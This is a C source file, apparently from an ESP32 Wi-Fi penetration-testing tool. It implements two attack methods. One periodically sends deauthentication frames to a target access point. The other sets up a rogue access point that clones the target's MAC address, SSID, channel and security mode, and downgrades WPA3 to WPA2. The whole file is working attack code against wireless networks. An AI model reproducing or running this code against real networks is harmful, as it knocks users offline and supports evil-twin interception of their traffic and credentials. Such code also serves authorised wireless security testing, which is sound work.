/**
 * @file attack_method.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 *
 * @brief Implements common methods for various attacks
 */
#include "attack_method.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_err.h"
#include "esp_log.h"
#include "esp_system.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "main:attack_method";
static esp_timer_handle_t deauth_timer_handle;

/**
 * @brief Callback for periodic deauthentication frame timer
 *
 * Periodicaly called to send deauthentication frame for given AP
 *
 * @param arg expects wifi_ap_record_t
 */
static void timer_send_deauth_frame(void *arg) {
  wsl_bypasser_send_deauth_frame((const attack_dos_config_t *)arg);
}

/**
 * @details Starts periodic timer for sending deauthentication frame via
 * timer_send_deauth_frame().
 */
void attack_method_broadcast(const attack_dos_config_t *attack_config,
                             unsigned period_sec) {
  const esp_timer_create_args_t deauth_timer_args = {
      .callback = &timer_send_deauth_frame, .arg = (void *)attack_config};
  ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
  ESP_ERROR_CHECK(
      esp_timer_start_periodic(deauth_timer_handle, period_sec * 1000000));
}

void attack_method_broadcast_stop() {
  ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
  esp_timer_delete(deauth_timer_handle);
}

/**
 * @note BSSID is MAC address of APs Wi-Fi interface
 *
 * @param ap_record target AP that will be cloned/duplicated
 */
void attack_method_rogueap(const wifi_ap_record_t *ap_record) {
  ESP_LOGD(TAG, "Configuring Rogue AP");
  wifictl_set_ap_mac(ap_record->bssid);

  wifi_config_t ap_config = {
      .ap = {.ssid_len = strlen((char *)ap_record->ssid),
             .channel = ap_record->primary,
             .authmode = ap_record->authmode,
             .max_connection = 1},
  };
  if (ap_config.ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK ||
      ap_config.ap.authmode == WIFI_AUTH_WPA3_PSK) {
    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
  }
  memcpy(ap_config.ap.ssid, ap_record->ssid, 32);
  esp_fill_random(ap_config.ap.password, 8);
  for (uint8_t i = 0; i < 8; i++) {
    if (ap_config.ap.password[i] == '\0') {
      ap_config.ap.password[i] = '\1';
    }
  }
  ap_config.ap.password[8] = '\0';
  wifictl_ap_start(&ap_config);
}